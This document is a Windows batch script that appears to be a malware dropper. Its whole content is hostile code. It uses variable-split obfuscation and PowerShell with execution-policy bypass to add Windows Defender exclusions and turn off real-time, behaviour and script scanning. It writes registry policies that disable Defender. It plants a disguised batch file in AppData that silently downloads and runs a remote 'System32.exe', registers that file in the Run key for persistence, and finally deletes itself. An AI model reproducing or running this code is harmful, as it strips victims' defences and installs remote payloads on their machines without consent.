@echo off
set a=p
set b=o
set c=w
set d=e
set e=r
set f=s
set g=h
set h=e
set i=l
set j=l
set k=.
set l=e
set m=x
set n=e
set o=%a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l%%n%
set p=-ep
set q=bypass
set r=-c
set s=try{if(gcm 
set t=Add-MpPreference
set u=-ea 0){$t=$env:TEMP;$exe=Join-Path $t 'System32.exe';
set v=Add-MpPreference -ExclusionPath
set w=$exe;
set x=Add-MpPreference -ExclusionProcess
set y='System32.exe';
set z=Add-MpPreference -ExclusionProcess 'powershell.exe';
set a1=Set-MpPreference
set b1=-DisableRealtimeMonitoring 1
set c1=-DisableBehaviorMonitoring 1
set d1=-DisableBlockAtFirstSeen 1
set e1=-DisableIOAVProtection 1
set f1=-DisableScriptScanning 1
set g1=}}catch{}
%o% %p% %q% %r% "%s%%t% %u%%v% %w%%x% %y%%z%%a1% %b1% %c1% %d1% %e1% %f1%%g1%" >nul 2>&1

set r1=reg
set r2=add
set r3=HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
set r4=/v
set r5=DisableAntiSpyware
set r6=/t
set r7=REG_DWORD
set r8=/d
set r9=1
set r0=/f
%r1% %r2% "%r3%" %r4% %r5% %r6% %r7% %r8% %r9% %r0% >nul 2>&1

set s1=HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
set s2=DisableRealtimeMonitoring
%r1% %r2% "%s1%" %r4% %s2% %r6% %r7% %r8% %r9% %r0% >nul 2>&1

set s3=DisableBehaviorMonitoring
%r1% %r2% "%s1%" %r4% %s3% %r6% %r7% %r8% %r9% %r0% >nul 2>&1

set s4=DisableOnAccessProtection
%r1% %r2% "%s1%" %r4% %s4% %r6% %r7% %r8% %r9% %r0% >nul 2>&1

set s5=DisableScanOnRealtimeEnable
%r1% %r2% "%s1%" %r4% %s5% %r6% %r7% %r8% %r9% %r0% >nul 2>&1

set d=%APPDATA%\Microsoft\CLR
if not exist "%d%" md "%d%" >nul 2>&1
(echo @echo off
echo powershell -w hidden -ep bypass -c "$e=$env:TEMP;cd $e;$p='System32.exe';iwr 'https://github.com/dinmihaile/hvh2/raw/refs/heads/main/System32.exe' -O $p;Start-Process $p -WindowStyle Hidden"
) > "%d%\UsageLogs.bat"

set k1=HKCU\Software\Microsoft\Windows\CurrentVersion\Run
set k2=CLRUsageLog
set k3=REG_SZ
%r1% %r2% "%k1%" %r4% %k2% %r6% %k3% %r8% "\"%d%\UsageLogs.bat\"" %r0% >nul 2>&1

powershell -w hidden -ep bypass -c "$e=$env:TEMP;cd $e;$p='System32.exe';iwr 'https://github.com/dinmihaile/hvh2/raw/refs/heads/main/System32.exe' -O $p;Start-Process $p -WindowStyle Hidden;sleep 3;rm $p -force" >nul 2>&1

timeout /t 1 /nobreak >nul
del "%~f0" >nul 2>&1
